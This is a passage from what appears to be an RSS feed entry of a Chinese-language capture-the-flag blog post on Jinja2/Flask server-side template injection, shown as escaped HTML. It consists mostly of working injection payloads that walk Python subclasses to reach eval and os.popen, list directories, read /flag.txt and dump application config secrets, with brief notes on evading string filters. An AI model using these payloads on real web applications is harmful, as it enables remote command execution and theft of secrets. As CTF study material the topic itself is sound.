style=&#34;color:#e6db74&#34;&gt;&amp;#39;eval&amp;#39;&lt;/span&gt;](&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤字符串，用字符拼接的方式&lt;/p&gt;&#xA;&lt;p&gt;config&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__class__.__init__.__globals__[app].config&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没有内置os模块的&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{[].__class__.__base__.__subclasses__()[59].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;)}}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有内置os模块的&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{[].__class__.__base__.__subclasses__()[71].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;懒得找模块就直接bp遍历一波&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls /&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}&#xA;&#xA;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag.txt&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;过滤参考网上大把&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
